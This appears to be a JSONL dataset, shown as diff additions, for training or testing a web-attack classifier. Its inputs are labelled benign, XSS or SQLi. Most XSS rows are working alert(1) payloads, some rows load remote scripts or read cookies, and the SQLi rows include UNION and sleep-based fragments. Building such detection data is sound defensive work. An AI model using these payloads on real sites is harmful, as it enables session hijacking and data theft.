+{"input":"username=ajohnson&password=u@!3uIlSeA","label":"benign"}
+{"input":"<svg><textarea onload=alert(1)><\/textarea>","label":"XSS"}
+{"input":"Interesting read!","label":"benign"}
+{"input":"Contact: eroberts@example.org","label":"benign"}
+{"input":"<div ondblclick=\"alert(1)\">test<\/div>","label":"XSS"}
+{"input":"username=melissa04&password=IOBP1xYq__","label":"benign"}
+{"input":"<optgroup oncontextmenu=\"alert(1)\">test<\/optgroup>","label":"XSS"}
+{"input":"<x onmouseover=alert(1)>hover this!","label":"XSS"}
+{"input":"<image src=\"javascript:alert(2)\"> \/\/ IE6, O10.10\u2193, OM10.0\u2193","label":"XSS"}
+{"input":"Hello, my name is Gregory Ferguson.","label":"benign"}
+{"input":"%60%60","label":"SQLi"}
+{"input":"<picture><source srcset=\"validimage.png\"><img onload=alert(1)><\/picture>","label":"XSS"}
+{"input":"<frameset onfocusout=alert(1) tabindex=1 id=x><\/frameset><input autofocus>","label":"XSS"}
+{"input":"<sub id=x tabindex=1 onfocusin=alert(1)><\/sub>","label":"XSS"}
+{"input":"<label onmouseover=\"alert(1)\">test<\/label>","label":"XSS"}
+{"input":"<\/svg>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"name=leslie39&email=jward@example.com","label":"benign"}
+{"input":"<marquee onmouseleave=\"alert(1)\">test<\/marquee>","label":"XSS"}
+{"input":"<dialog ondblclick=\"alert(1)\">test<\/dialog>","label":"XSS"}
+{"input":"<tfoot id=x tabindex=1 onbeforeactivate=alert(1)><\/tfoot>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><isindex style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/isindex>","label":"XSS"}
+{"input":"<progress oncontextmenu=\"alert(1)\">test<\/progress>","label":"XSS"}
+{"input":"what is cooking?","label":"benign"}
+{"input":"<object onkeyup=\"alert(1)\" contenteditable>test<\/object>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><select style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/select>","label":"XSS"}
+{"input":"search=what is travel?","label":"benign"}
+{"input":"<bgsound onbeforecut=\"alert(1)\" contenteditable>test<\/bgsound>","label":"XSS"}
+{"input":"<strike onbeforepaste=\"alert(1)\" contenteditable>test<\/strike>","label":"XSS"}
+{"input":"{\"user\": \"kjohnson\", \"action\": \"delete\", \"timestamp\": \"1984-12-22T04:48:14\"}","label":"benign"}
+{"input":"<? foo=\"><script>alert(91)<\/script>\">","label":"XSS"}
+{"input":"{\"user\": \"derekmyers\", \"action\": \"edit\", \"timestamp\": \"2021-11-23T15:34:43\"}","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><marquee style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/marquee>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><embed style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/embed>","label":"XSS"}
+{"input":"name=sarahsmith&email=jeanhunt@example.net","label":"benign"}
+{"input":"<track oncut=\"alert(1)\" contenteditable>test<\/track>","label":"XSS"}
+{"input":"{\"user\": \"dhall\", \"action\": \"view\", \"timestamp\": \"2011-11-08T20:40:17\"}","label":"benign"}
+{"input":"{\"user\": \"diana82\", \"action\": \"delete\", \"timestamp\": \"1990-03-23T15:34:21\"}","label":"benign"}
+{"input":"Hello, my name is Amy Campbell.","label":"benign"}
+{"input":"<rp id=x tabindex=1 onfocusin=alert(1)><\/rp>","label":"XSS"}
+{"input":"<param onkeyup=\"alert(1)\" contenteditable>test<\/param>","label":"XSS"}
+{"input":"<base onkeyup=\"alert(1)\" contenteditable>test<\/base>","label":"XSS"}
+{"input":"<title onkeydown=\"alert(1)\" contenteditable>test<\/title>","label":"XSS"}
+{"input":"<nav onmouseleave=\"alert(1)\">test<\/nav>","label":"XSS"}
+{"input":"<cite onblur=alert(1) tabindex=1 id=x><\/cite><input autofocus>","label":"XSS"}
+{"input":"<dt draggable=\"true\" ondragend=\"alert(1)\">test<\/dt>","label":"XSS"}
+{"input":"<link onbeforecopy=\"alert(1)\" contenteditable>test<\/link>","label":"XSS"}
+{"input":"what is travel?","label":"benign"}
+{"input":"<!a foo=x=`y><img alt=\"`><img src=xx:x onerror=alert(2)\/\/\">","label":"XSS"}
+{"input":"username=julie43&password=P24MMGhB&+","label":"benign"}
+{"input":"<aside onmousemove=\"alert(1)\">test<\/aside>","label":"XSS"}
+{"input":"<small draggable=\"true\" ondragstart=\"alert(1)\">test<\/small>","label":"XSS"}
+{"input":"<li id=x tabindex=1 onfocus=alert(1)><\/li>","label":"XSS"}
+{"input":"<i id=x tabindex=1 onactivate=alert(1)><\/i>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><sub style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/sub>","label":"XSS"}
+{"input":"<x onxxx=1 onxxx=1","label":"XSS"}
+{"input":"<tfoot id=x tabindex=1 onactivate=alert(1)><\/tfoot>","label":"XSS"}
+{"input":"<dfn oncut=\"alert(1)\" contenteditable>test<\/dfn>","label":"XSS"}
+{"input":"{\"user\": \"julie40\", \"action\": \"edit\", \"timestamp\": \"1978-08-14T03:07:10\"}","label":"benign"}
+{"input":"<slot draggable=\"true\" ondragleave=\"alert(1)\">test<\/slot>","label":"XSS"}
+{"input":"<body onunhandledrejection=alert(1)><script>fetch('\/\/xyz')<\/script>","label":"XSS"}
+{"input":"Contact: patriciagutierrez@example.com","label":"benign"}
+{"input":"GET \/tag HTTP\/1.1","label":"benign"}
+{"input":"GET \/posts\/tag HTTP\/1.1","label":"benign"}
+{"input":"page=12&sort=asc","label":"benign"}
+{"input":"Time-Based:","label":"SQLi"}
+{"input":"<div id=\"42\"><head><base href=\"javascript:\/\/\"\/><\/head><body><a href=\"\/. \/,alert(42)\/\/#\">XXX<\/a><\/body>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><address style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/address>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><noscript id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/noscript>","label":"XSS"}
+{"input":"<embed onfocusout=alert(1) tabindex=1 id=x><\/embed><input autofocus>","label":"XSS"}
+{"input":"<noscript onmouseleave=\"alert(1)\">test<\/noscript>","label":"XSS"}
+{"input":"{\"user\": \"rossjames\", \"action\": \"delete\", \"timestamp\": \"1980-04-08T21:57:06\"}","label":"benign"}
+{"input":"Hello, my name is Nathan Crawford.","label":"benign"}
+{"input":"GET \/app\/list HTTP\/1.1","label":"benign"}
+{"input":"<menuitem oncut=\"alert(1)\" contenteditable>test<\/menuitem>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><i id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/i>","label":"XSS"}
+{"input":"<menuitem onmouseover=\"alert(1)\">test<\/menuitem>","label":"XSS"}
+{"input":"<small draggable=\"true\" ondragleave=\"alert(1)\">test<\/small>","label":"XSS"}
+{"input":"<colgroup onmouseover=\"alert(1)\">test<\/colgroup>","label":"XSS"}
+{"input":"<spacer onkeydown=\"alert(1)\" contenteditable>test<\/spacer>","label":"XSS"}
+{"input":"<nav onkeyup=\"alert(1)\" contenteditable>test<\/nav>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><object style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/object>","label":"XSS"}
+{"input":"<object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" onqt_error=\"alert(126)\" style=\"behavior:url(#x);\"><param name=postdomevents \/><\/object>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"<tbody draggable=\"true\" ondrag=\"alert(1)\">test<\/tbody>","label":"XSS"}
+{"input":"<script>alert(document.documentElement.innerHTML.match(\/'([^']%2b)\/)[1])<\/script>","label":"XSS"}
+{"input":"<strike ondblclick=\"alert(1)\">test<\/strike>","label":"XSS"}
+{"input":"GET \/search\/category HTTP\/1.1","label":"benign"}
+{"input":"<aside id=x tabindex=1 onbeforedeactivate=alert(1)><\/aside><input autofocus>","label":"XSS"}
+{"input":"Hello, my name is Gregory Howard.","label":"benign"}
+{"input":"<progress onmousedown=\"alert(1)\">test<\/progress>","label":"XSS"}
+{"input":"search=what is python?","label":"benign"}
+{"input":"{\"user\": \"mariawood\", \"action\": \"edit\", \"timestamp\": \"2007-09-03T12:32:45\"}","label":"benign"}
+{"input":"@@VaRiAbLe    GlObAl vArIaBlE","label":"SQLi"}
+{"input":"<plaintext onkeyup=\"alert(1)\" contenteditable>test<\/plaintext>","label":"XSS"}
+{"input":"Hello, my name is Troy White.","label":"benign"}
+{"input":"<bdi oncontextmenu=\"alert(1)\">test<\/bdi>","label":"XSS"}
+{"input":"GET \/explore HTTP\/1.1","label":"benign"}
+{"input":"GET \/search\/list\/tag HTTP\/1.1","label":"benign"}
+{"input":"<p draggable=\"true\" ondragenter=\"alert(1)\">test<\/p>","label":"XSS"}
+{"input":"<plaintext onclick=\"alert(1)\">test<\/plaintext>","label":"XSS"}
+{"input":"<textarea onmouseleave=\"alert(1)\">test<\/textarea>","label":"XSS"}
+{"input":"<br onfocusout=alert(1) tabindex=1 id=x><\/br><input autofocus>","label":"XSS"}
+{"input":"<span onmousemove=\"alert(1)\">test<\/span>","label":"XSS"}
+{"input":"Nice article!","label":"benign"}
+{"input":"<base onbeforecut=\"alert(1)\" contenteditable>test<\/base>","label":"XSS"}
+{"input":"Hello, my name is Zachary Lin.","label":"benign"}
+{"input":"<object onclick=\"alert(1)\">test<\/object>","label":"XSS"}
+{"input":"page=3&sort=desc","label":"benign"}
+{"input":"Hello, my name is Christopher Powers.","label":"benign"}
+{"input":"<menu onmousedown=\"alert(1)\">test<\/menu>","label":"XSS"}
+{"input":"<font onmouseleave=\"alert(1)\">test<\/font>","label":"XSS"}
+{"input":"<time onbeforecut=\"alert(1)\" contenteditable>test<\/time>","label":"XSS"}
+{"input":"page=9&sort=desc","label":"benign"}
+{"input":"Hello, my name is Shannon Hernandez.","label":"benign"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><slot id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/slot>","label":"XSS"}
+{"input":"<col onbeforecopy=\"alert(1)\" contenteditable>test<\/col>","label":"XSS"}
+{"input":"1' GROUP BY 1,2,3--+","label":"SQLi"}
+{"input":"<\/a>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'\/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(\/document.cookie%5Cs%2B=%5Cs%2B'(.*)'\/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; <\/script>#","label":"XSS"}
+{"input":"page=17&sort=asc","label":"benign"}
+{"input":"page=11&sort=asc","label":"benign"}
+{"input":"search=how to music tutorial","label":"benign"}
+{"input":"\/*start*\/'''''''''''''UNION SELECT '2\/*end*\/","label":"SQLi"}
+{"input":"<<scr\\0ipt\/src=http:\/\/xss.com\/xss.js><\/script","label":"XSS"}
+{"input":")a)))01(peels(tceles(02%morf02%*02%tceles(c2%","label":"SQLi"}
+{"input":"<select autofocus onfocusin=alert(1)>","label":"XSS"}
+{"input":"<canvas id=x tabindex=1 onfocusin=alert(1)><\/canvas>","label":"XSS"}
+{"input":"Helpful post!","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><textarea ondrop=alert(1) contenteditable>drop here<\/textarea>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><bdo style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/bdo>","label":"XSS"}
+{"input":"best cooking books","label":"benign"}
+{"input":"<ol id=x tabindex=1 onfocusin=alert(1)><\/ol>","label":"XSS"}
+{"input":"<th onbeforepaste=\"alert(1)\" contenteditable>test<\/th>","label":"XSS"}
+{"input":"<menu onclick=\"alert(1)\">test<\/menu>","label":"XSS"}
+{"input":"<html ontouchmove=alert(1)>","label":"XSS"}
+{"input":"Contact: seth88@example.com","label":"benign"}
+{"input":"<svg><source onload=alert(1)><\/source>","label":"XSS"}
+{"input":"<table id=x tabindex=1 onfocus=alert(1)><\/table>","label":"XSS"}
+{"input":"feedback=Other however gas half ask.","label":"benign"}
+{"input":"<object id=x tabindex=1 onactivate=alert(1)><\/object>","label":"XSS"}
+{"input":"page=10&sort=asc","label":"benign"}
+{"input":"<script onbeforecut=\"alert(1)\" contenteditable>test<\/script>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><form style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/form>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><rtc ondrop=alert(1) contenteditable>drop here<\/rtc>","label":"XSS"}
+{"input":"{\"user\": \"ana27\", \"action\": \"download\", \"timestamp\": \"1977-04-09T06:05:04\"}","label":"benign"}
+{"input":"<html id=x tabindex=1 onfocus=alert(1)><\/html>","label":"XSS"}
+{"input":"<p onclick=\"alert(1)\">test<\/p>","label":"XSS"}
+{"input":"<menuitem draggable=\"true\" ondragend=\"alert(1)\">test<\/menuitem>","label":"XSS"}
+{"input":"{\"user\": \"davisdouglas\", \"action\": \"delete\", \"timestamp\": \"1984-01-18T05:44:40\"}","label":"benign"}
+{"input":"<!-- Up to Opera 11.64 - see link below -->","label":"XSS"}
+{"input":"<data oncontextmenu=\"alert(1)\">test<\/data>","label":"XSS"}
+{"input":"<image src\/onerror=prompt(8)>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><picture ondragover=alert(1) contenteditable>drop here<\/picture>","label":"XSS"}
+{"input":"<%78 onxxx=1","label":"XSS"}
+{"input":"<samp onmouseenter=\"alert(1)\">test<\/samp>","label":"XSS"}
+{"input":"<output onclick=\"alert(1)\">test<\/output>","label":"XSS"}
+{"input":"<center onpaste=\"alert(1)\" contenteditable>test<\/center>","label":"XSS"}
+{"input":"<ruby id=x tabindex=1 onactivate=alert(1)><\/ruby>","label":"XSS"}
+{"input":"<summary ondblclick=\"alert(1)\">test<\/summary>","label":"XSS"}
+{"input":"Insightful article!","label":"benign"}
+{"input":"<picture id=x tabindex=1 onbeforeactivate=alert(1)><\/picture>","label":"XSS"}
+{"input":"<strong onmouseup=\"alert(1)\">test<\/strong>","label":"XSS"}
+{"input":"Contact: josephcarla@example.net","label":"benign"}
+{"input":"<blink draggable=\"true\" ondragleave=\"alert(1)\">test<\/blink>","label":"XSS"}
+{"input":"<param id=x tabindex=1 onbeforedeactivate=alert(1)><\/param><input autofocus>","label":"XSS"}
+{"input":"Contact: cassandra60@example.org","label":"benign"}
+{"input":"GET \/blog HTTP\/1.1","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><menu style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/menu>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><sup style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/sup>","label":"XSS"}
+{"input":"GET \/posts\/category\/app HTTP\/1.1","label":"benign"}
+{"input":"<link onmouseleave=\"alert(1)\">test<\/link>","label":"XSS"}
+{"input":"<select onmousedown=\"alert(1)\">test<\/select>","label":"XSS"}
+{"input":"<noframes onpaste=\"alert(1)\" contenteditable>test<\/noframes>","label":"XSS"}
+{"input":"GET \/main\/posts HTTP\/1.1","label":"benign"}
+{"input":"best music books","label":"benign"}
+{"input":"page=15&sort=asc","label":"benign"}
+{"input":"<title onmouseup=\"alert(1)\">test<\/title>","label":"XSS"}
+{"input":"<! '=\"foo\"><x foo='><img src=x onerror=alert(2)\/\/'>","label":"XSS"}
+{"input":"<article onkeydown=\"alert(1)\" contenteditable>test<\/article>","label":"XSS"}
+{"input":"Contact: collinsgary@example.org","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><th style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/th>","label":"XSS"}
+{"input":"<blockquote draggable=\"true\" ondragstart=\"alert(1)\">test<\/blockquote>","label":"XSS"}
+{"input":"eurt-1","label":"SQLi"}
+{"input":"{\"user\": \"mullinsrichard\", \"action\": \"view\", \"timestamp\": \"2014-12-19T12:22:58\"}","label":"benign"}
+{"input":"<img onmousedown=\"alert(1)\">test<\/img>","label":"XSS"}
+{"input":"finance examples in 2025","label":"benign"}
+{"input":"<fieldset draggable=\"true\" ondragend=\"alert(1)\">test<\/fieldset>","label":"XSS"}
+{"input":"<wbr onbeforepaste=\"alert(1)\" contenteditable>test<\/wbr>","label":"XSS"}
+{"input":"Hello, my name is Travis Huang.","label":"benign"}
+{"input":"Contact: shannon38@example.com","label":"benign"}
+{"input":"best machine learning books","label":"benign"}
+{"input":"Contact: tiffany48@example.com","label":"benign"}
+{"input":"<br oncontextmenu=\"alert(1)\">test<\/br>","label":"XSS"}
+{"input":"<tr draggable=\"true\" ondragend=\"alert(1)\">test<\/tr>","label":"XSS"}
+{"input":"<summary id=x tabindex=1 onfocus=alert(1)><\/summary>","label":"XSS"}
+{"input":"Contact: lisa33@example.net","label":"benign"}
+{"input":"top 10 machine learning blogs","label":"benign"}
+{"input":"what is travel?","label":"benign"}
+{"input":"GET \/tag\/list\/explore HTTP\/1.1","label":"benign"}
+{"input":"<base draggable=\"true\" ondragend=\"alert(1)\">test<\/base>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><h1 id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/h1>","label":"XSS"}
+{"input":"<multicol id=x tabindex=1 ondeactivate=alert(1)><\/multicol><input id=y autofocus>","label":"XSS"}
+{"input":"top 10 cooking blogs","label":"benign"}
+{"input":"{\"user\": \"lespinoza\", \"action\": \"view\", \"timestamp\": \"1981-07-11T06:48:05\"}","label":"benign"}
+{"input":"<style>:target {color:red;}<\/style><slot id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/slot>","label":"XSS"}
+{"input":"<dfn draggable=\"true\" ondrag=\"alert(1)\">test<\/dfn>","label":"XSS"}
+{"input":"top 10 cooking blogs","label":"benign"}
+{"input":"<dialog onfocusout=alert(1) tabindex=1 id=x><\/dialog><input autofocus>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><video id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/video>","label":"XSS"}
+{"input":"<li id=x tabindex=1 onfocusin=alert(1)><\/li>","label":"XSS"}
+{"input":"<samp onpaste=\"alert(1)\" contenteditable>test<\/samp>","label":"XSS"}
+{"input":"<li draggable=\"true\" ondragend=\"alert(1)\">test<\/li>","label":"XSS"}
+{"input":"Hello, my name is Karen Le.","label":"benign"}
+{"input":"Hello, my name is Timothy Thornton.","label":"benign"}
+{"input":"+--0='","label":"SQLi"}
+{"input":"<image draggable=\"true\" ondragleave=\"alert(1)\">test<\/image>","label":"XSS"}
+{"input":"<keygen autofocus onfocus=alert(1)>","label":"XSS"}
+{"input":"<button oncut=\"alert(1)\" contenteditable>test<\/button>","label":"XSS"}
+{"input":"<img\/src\/onerror=prompt(8)>","label":"XSS"}
+{"input":"<plaintext onfocusout=alert(1) tabindex=1 id=x><\/plaintext><input autofocus>","label":"XSS"}
+{"input":"search=top 10 finance blogs","label":"benign"}
+{"input":"<body onresize=alert(1)>press F12!","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><wbr id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/wbr>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><s style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/s>","label":"XSS"}
+{"input":"\" ro '","label":"SQLi"}
+{"input":"{\"user\": \"fmorales\", \"action\": \"delete\", \"timestamp\": \"2021-05-14T10:55:23\"}","label":"benign"}
+{"input":"Nice read!","label":"benign"}
+{"input":"<area onkeyup=\"alert(1)\" contenteditable>test<\/area>","label":"XSS"}
+{"input":"best music books","label":"benign"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><option id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/option>","label":"XSS"}
+{"input":"<rt id=x tabindex=1 onactivate=alert(1)><\/rt>","label":"XSS"}
+{"input":"Hello, my name is Larry Martin.","label":"benign"}
+{"input":"GET \/search\/main\/posts HTTP\/1.1","label":"benign"}
+{"input":"<fieldset id=x tabindex=1 onbeforeactivate=alert(1)><\/fieldset>","label":"XSS"}
+{"input":"Contact: taraburns@example.net","label":"benign"}
+{"input":"<acronym onmouseleave=\"alert(1)\">test<\/acronym>","label":"XSS"}
+{"input":"Insightful post!","label":"benign"}
+{"input":"Insightful tutorial!","label":"benign"}
+{"input":"Hello, my name is Joseph Madden.","label":"benign"}
+{"input":"<slot onpaste=\"alert(1)\" contenteditable>test<\/slot>","label":"XSS"}
+{"input":"username=jonesjohnny&password=n(34#Gkdhd","label":"benign"}
+{"input":"<title draggable=\"true\" ondragleave=\"alert(1)\">test<\/title>","label":"XSS"}
+{"input":"<thead onmousedown=\"alert(1)\">test<\/thead>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><meter style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/meter>","label":"XSS"}
+{"input":"Insightful article!","label":"benign"}
+{"input":"<track onfocusout=alert(1) tabindex=1 id=x><\/track><input autofocus>","label":"XSS"}
+{"input":"GET \/app\/blog HTTP\/1.1","label":"benign"}
+{"input":"<meter onmouseout=\"alert(1)\">test<\/meter>","label":"XSS"}
+{"input":"<progress onmouseover=\"alert(1)\">test<\/progress>","label":"XSS"}
+{"input":"<blockquote id=x tabindex=1 onfocus=alert(1)><\/blockquote>","label":"XSS"}
+{"input":"<svg><map onload=alert(1)><\/map>","label":"XSS"}
+{"input":"<legend id=x tabindex=1 onfocus=alert(1)><\/legend>","label":"XSS"}
+{"input":"Contact: grahamlisa@example.org","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><nobr style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/nobr>","label":"XSS"}
+{"input":"GET \/blog HTTP\/1.1","label":"benign"}
+{"input":"top 10 cooking blogs","label":"benign"}
+{"input":"<strike id=x tabindex=1 onfocus=alert(1)><\/strike>","label":"XSS"}
+{"input":"<iframe onmouseleave=\"alert(1)\">test<\/iframe>","label":"XSS"}
+{"input":"<dl ondblclick=\"alert(1)\">test<\/dl>","label":"XSS"}
+{"input":"<body oncut=\"alert(1)\" contenteditable>test<\/body>","label":"XSS"}
+{"input":"<template id=x tabindex=1 ondeactivate=alert(1)><\/template><input id=y autofocus>","label":"XSS"}
+{"input":"<span oncopy=\"alert(1)\" contenteditable>test<\/span>","label":"XSS"}
+{"input":"<figure id=x tabindex=1 onbeforedeactivate=alert(1)><\/figure><input autofocus>","label":"XSS"}
+{"input":"<code onkeyup=\"alert(1)\" contenteditable>test<\/code>","label":"XSS"}
+{"input":"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">","label":"XSS"}
+{"input":"<li onmouseout=\"alert(1)\">test<\/li>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><details style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/details>","label":"XSS"}
+{"input":"Contact: pdean@example.com","label":"benign"}
+{"input":"<dl onbeforecopy=\"alert(1)\" contenteditable>test<\/dl>","label":"XSS"}
+{"input":"<body onscroll=alert(1)><div style=height:1000px><\/div><div id=x><\/div>","label":"XSS"}
+{"input":"<plaintext draggable=\"true\" ondrag=\"alert(1)\">test<\/plaintext>","label":"XSS"}
+{"input":"<meter onmouseover=\"alert(1)\">test<\/meter>","label":"XSS"}
+{"input":"<acronym onclick=\"alert(1)\">test<\/acronym>","label":"XSS"}
+{"input":"<select onbeforepaste=\"alert(1)\" contenteditable>test<\/select>","label":"XSS"}
+{"input":"<picture onfocusout=alert(1) tabindex=1 id=x><\/picture><input autofocus>","label":"XSS"}
+{"input":"{\"user\": \"rlee\", \"action\": \"view\", \"timestamp\": \"2006-02-24T07:05:25\"}","label":"benign"}
+{"input":"{\"user\": \"hchavez\", \"action\": \"delete\", \"timestamp\": \"2013-01-21T17:57:20\"}","label":"benign"}
+{"input":"<td onmousedown=\"alert(1)\">test<\/td>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><optgroup style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/optgroup>","label":"XSS"}
+{"input":"<blink id=x tabindex=1 onactivate=alert(1)><\/blink>","label":"XSS"}
+{"input":"<li id=x tabindex=1 onbeforedeactivate=alert(1)><\/li><input autofocus>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><param style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/param>","label":"XSS"}
+{"input":"Hello, my name is Michelle Carter.","label":"benign"}
+{"input":"Contact: ijohnson@example.org","label":"benign"}
+{"input":"Hello, my name is James Simon.","label":"benign"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><nav id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/nav>","label":"XSS"}
+{"input":"<nobr draggable=\"true\" ondragend=\"alert(1)\">test<\/nobr>","label":"XSS"}
+{"input":"best finance books","label":"benign"}
+{"input":"<ol onmouseover=\"alert(1)\">test<\/ol>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><tr style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/tr>","label":"XSS"}
+{"input":"<slot ondblclick=\"alert(1)\">test<\/slot>","label":"XSS"}
+{"input":"<dt onkeydown=\"alert(1)\" contenteditable>test<\/dt>","label":"XSS"}
+{"input":"<form id=x tabindex=1 onfocusin=alert(1)><\/form>","label":"XSS"}
+{"input":"<abbr onfocusout=alert(1) tabindex=1 id=x><\/abbr><input autofocus>","label":"XSS"}
+{"input":"best cooking books","label":"benign"}
+{"input":"GET \/posts HTTP\/1.1","label":"benign"}
+{"input":"<big id=x tabindex=1 onfocus=alert(1)><\/big>","label":"XSS"}
+{"input":"*{background:url(xx:x \/\/**\/\\red\/*)} \/* IE 6-7 Standards mode *\/","label":"XSS"}
+{"input":"feedback=Such year change city purpose old fund discuss.","label":"benign"}
+{"input":"<code onblur=alert(1) tabindex=1 id=x><\/code><input autofocus>","label":"XSS"}
+{"input":"<ul oncontextmenu=\"alert(1)\">test<\/ul>","label":"XSS"}
+{"input":"<image draggable=\"true\" ondrag=\"alert(1)\">test<\/image>","label":"XSS"}
+{"input":"Contact: everetttracy@example.net","label":"benign"}
+{"input":"{\"user\": \"cindydowns\", \"action\": \"delete\", \"timestamp\": \"1980-07-29T22:10:29\"}","label":"benign"}
+{"input":"<center id=x tabindex=1 ondeactivate=alert(1)><\/center><input id=y autofocus>","label":"XSS"}
+{"input":"GET \/wp-content\/main HTTP\/1.1","label":"benign"}
+{"input":"<figure oncut=\"alert(1)\" contenteditable>test<\/figure>","label":"XSS"}
+{"input":"<form oncontextmenu=\"alert(1)\">test<\/form>","label":"XSS"}
+{"input":"'%0a UNION%0d SELECT%09 sum(columnname%0d )%0d from%09 tablename%0a --\/*random*\/","label":"SQLi"}
+{"input":"<em id=x tabindex=1 ondeactivate=alert(1)><\/em><input id=y autofocus>","label":"XSS"}
+{"input":"GET \/app HTTP\/1.1","label":"benign"}
+{"input":"<dl oncontextmenu=\"alert(1)\">test<\/dl>","label":"XSS"}
+{"input":"<textarea onmousemove=\"alert(1)\">test<\/textarea>","label":"XSS"}
+{"input":"GET \/tag HTTP\/1.1","label":"benign"}
+{"input":"username=fowlermark&password=h3%jT1BhGL","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><button id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/button>","label":"XSS"}
+{"input":"<spacer oncopy=\"alert(1)\" contenteditable>test<\/spacer>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><tfoot style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/tfoot>","label":"XSS"}
+{"input":"<th ondblclick=\"alert(1)\">test<\/th>","label":"XSS"}
+{"input":"<style>:target {color: red;}<\/style><style id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/style>","label":"XSS"}
+{"input":"Contact: lle@example.net","label":"benign"}
+{"input":"<script>alert(1)<\/script>","label":"XSS"}
+{"input":"Contact: zachary54@example.com","label":"benign"}
+{"input":"feedback=Maintain impact painting throw.","label":"benign"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><span id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/span>","label":"XSS"}
+{"input":"<ul draggable=\"true\" ondragend=\"alert(1)\">test<\/ul>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><marquee id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/marquee>","label":"XSS"}
+{"input":"best finance books","label":"benign"}
